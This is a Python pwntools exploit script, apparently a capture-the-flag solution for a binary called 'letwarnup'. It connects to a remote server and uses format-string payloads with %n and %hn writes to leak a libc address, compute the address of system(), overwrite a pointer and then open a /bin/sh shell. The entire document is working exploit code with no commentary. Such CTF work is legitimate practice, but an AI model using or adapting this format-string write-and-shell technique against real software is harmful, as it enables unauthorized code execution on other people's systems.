#!/usr/bin/env python3

from pwn import *

#context.log_level = 'debug'

exe = ELF("./letwarnup_patched")
libc = ELF("./libc-2.31.so")
ld = ELF("./ld-2.31.so")

system_offset = libc.symbols['system']
libc_start_main_ret_offset = 0x0270b3

#conn = process('./letwarnup_patched')
conn = connect('45.122.249.68', 10005)

payload1 = b"%c%c%c%c%c%c%4210746c%n%53654x%hn"
payload2 = b'%15$p'

input('GDB>')

conn.recvuntil(b'Enter your string:')
conn.sendline(payload1)
try:
    conn.recvuntil(b'Enter your string:')
except:
    print('[-] Disconnect!')
    exit(-1)
conn.sendline(payload2)
libc_start_main_ret_addr = int(conn.recvuntil(b'Enter your string:').split(b'\n')[1].decode(), 16)
print('[+] Leak __libc_start_main_ret:', hex(libc_start_main_ret_addr))
libc_base = libc_start_main_ret_addr - libc_start_main_ret_offset
system_addr = libc_base + system_offset
print('[+] Found libc base:', hex(libc_base))
print('[+] System address:', hex(system_addr))

# %x%x%x%x%x%x%x%x%x%x%4210665x%n%41603x%hn
bytes_to_overwrite = str(int(hex(system_addr)[8:12], 16) - 0x4020 - 1).encode()
payload3 = b'%c%c%c%c%c%c%c%c%c%c%c%c%c%c%4210707c%n%' + bytes_to_overwrite + b'c%hn'
conn.sendline(payload3)
conn.recvuntil(b'Enter your string:')
conn.sendline(b'/bin/sh')

conn.interactive()